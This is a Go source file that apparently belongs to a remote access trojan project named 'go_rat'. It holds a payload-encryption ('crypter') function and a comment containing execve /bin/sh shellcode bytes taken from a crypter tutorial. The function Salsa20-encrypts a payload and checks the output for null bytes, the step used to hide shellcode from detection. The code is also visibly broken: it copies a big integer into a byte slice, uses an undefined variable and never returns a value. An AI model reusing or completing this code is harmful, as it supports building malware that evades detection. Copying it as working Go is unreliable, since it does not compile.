/*/
Uses code from:
https://snowscan.io/custom-crypter/

	// execve shellcode /bin/sh
	in := []byte{
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43}

	out := make([]byte, len(in))

	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}


/*/

package CryptographicFunctions

import (
	"crypto/rand"
	"fmt"
	"go_rat/pkg/shared_code/ErrorHandling"
	"math/big"
	"os"

	"golang.org/x/crypto/salsa20"
)

// This function uses the Salsa20 to encrypt a byte field
// with a variable sized nonce
func ByteSizedSalsa(bytes_in []byte, NonceSize int) (Salsa []byte, derp error) {
	var p *big.Int
	out := make([]byte, len(bytes_in))
	// Generate a random 24 bytes nonce
	herp := make([]byte, 24)
	p, derp = rand.Prime(rand.Reader, NonceSize)
	nonce, derp := copy(herp, p)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
		//return
	}

	// Generate a random 32 bytes buffer for key
	key_slice := make([]byte, 32)

	slice, derp := rand.Read(key_slice)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
		//return
	}
	var key [32]byte
	copy(key[:], key_slice[:])

	salsa20.XORKeyStream(out, in, nonce, &key)

	for _, element := range out {
		if element == 0 {
			fmt.Printf("##########################\n")
			fmt.Printf("WARNING null byte detected\n")
			fmt.Printf("##########################\n")
			os.Exit(1)
		}
	}
}
